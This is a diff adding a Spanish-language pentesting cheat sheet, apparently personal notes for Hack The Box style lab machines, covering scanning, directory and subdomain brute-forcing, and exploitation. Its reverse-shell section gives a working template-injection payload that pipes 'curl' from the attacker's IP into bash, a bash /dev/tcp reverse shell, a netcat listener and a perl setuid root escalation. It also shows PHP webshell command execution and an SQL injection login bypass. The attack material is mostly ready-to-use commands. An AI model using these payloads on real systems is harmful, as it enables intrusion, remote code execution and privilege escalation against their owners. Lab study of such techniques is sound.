@@ -1,0 +1,98 @@
+BUSCAR UN ARCHIVO:
+-find \-name <NOMBRE> 2>/dev/null
+(busca el nombre con su extensión en el directorio y en los subdirectorios, también "suprime" cualquier error y no lo muestra)
+
+DESCOMPRIMIR POR TERMINAL:
+-unzip <ARCHIVO>
+
+ESCANEAR:
+-sudo nmap -p- -A -sC -sY -sV --open -sS -n 10.10.11.208 -oN analisis1
+
+EXPLOIT, BUSCAR:
+-searchsploit <WEB>
+Buscar un exploit para la web indicada.
+
+FUERZA BRUTA, DIRB:
+-dirb <URL>
+Subdirectorio por diccionario en la url.
+
+FUERZA BRUTA, IMPORTAR UN DICCIONARIO DE GITHUB:
+-wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/bitquark-subdomains-top100000.txt
+
+FUERZA BRUTA, PASSWORD:
+Con “hydra” se puede probar por fuerza bruta una password.
+
+FUERZA BRUTA, PROBAR DIRECTORIOS:
+-gobuster dir -u http://10.129.4.211/ -w ../Diccionarios/directorios1.txt -t 100 -q
+(-q sirve para que aparezcan solo los que se han encontrado)
+(-x es para las extensiones de archivos, ¡buscar en internet!)
+
+FUERZA BRUTA DIRECTORIOS Y SUBDOMINIOS:
+-wfuzz -c --hc 404 -t 200 -w <DIR-PATH> -u <URL> -H "Host: FUZZ.<DOMINIO>"
+(donde ponga FUZZ se sustituye por la palabra del diccionario, también puede estar en la url)
+
+FUERZA BRUTA, PROBAR SUBDOMINIOS:
+-gobuster vhost -w ../Diccionarios/diccionarioSubdominios.txt -u http://searcher.htb
+(si fuera https se pone al final "-k")
+(a mi me ha funcionado sin la palabra "vhost")
+
+
+INSPECCIONAR, CÓDIGO FUENTE WEB (HTML):
+Con la combinación “Cntrl + u” puedes ver el html de la web.
+
+PRIVILEGIOS, ESCALAR PRIVILEGIOS:
+-sudo -l
+Para saber qué puedes usar.
+
+PUERTO 80 ACTIVO:
+-sudo nano /etc/hosts
+-whatweb 10.10.11.208
+
+PUERTOS:
+20/21-->FTP
+22----->SFTP
+80----->WEB
+443---->HTTPS
+445---->SMB
+
+SERVIDOR SENCILLO EN PYTHON PARA SHELL REVERSA:
+·Aprovechando un input text de la web se añade lo siguiente en el campo de texto:
+"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl 10.10.14.30 | bash')\")()}}"
+(donde la ip es la nuestra)
+(en caso de que en el front se compruebe algo se puede usar la herramienta para interceptar peticiones Burp Suite)
+·Se crea un ".html" con el texto siguiente:
+`
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.30/444 0>&1
+`
+(donde la ip es la nuestra y el puerto el que sea)
+·Se runea con el comando:
+-python -m http.server 80
+·Se escucha con NetCat:
+-sudo nc -nlvp 444
+(que es el puerto del comando bash)
+·Para saber qué puedes hacer con el usuario actual(capabilities):
+-getcap -r / 2>/dev/null
+·Para elevar permisos:
+-/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "ls";'
+(donde "ls" se cambia por el comando que sea porque se va a ejecutar como root)
+
+REVERSE SHELL EN PHP:
+Si consigues tener un código malicioso en php dentro de la máquina y entras en la url del archivo(https://…/pwned.php), le concatenas a esa url “?cmd=whoami” ya puedes ejecutar lo que sea, en este caso “whoami”
+
+SQL:
+-mysql -u root -h <IP>   // Para usar mysql sin contraseña.
+-show databases          // Para ver todas las bases de datos que hay.
+-use <DB>                // Para usar una base de datos de las que hay.
+-show tables;            // Para mostrar las tablas de una base de datos.
+
+SQL INJECTIONS:
+-admin' or 1=1;#   // Input type to login, la almohadilla sirve para comentar el campo de contraseña.
+
+URL, PAYLOADS VARIOS:
+https://gtfobins.github.io/
+
+VPN:
+-sudo openvpn s_p.ovpn
+Puede fallar y entonces hay que cerrar la interfaz con "sudo ifconfig tun0 down".
+(donde "tun0" es la interfaz de la vpn)
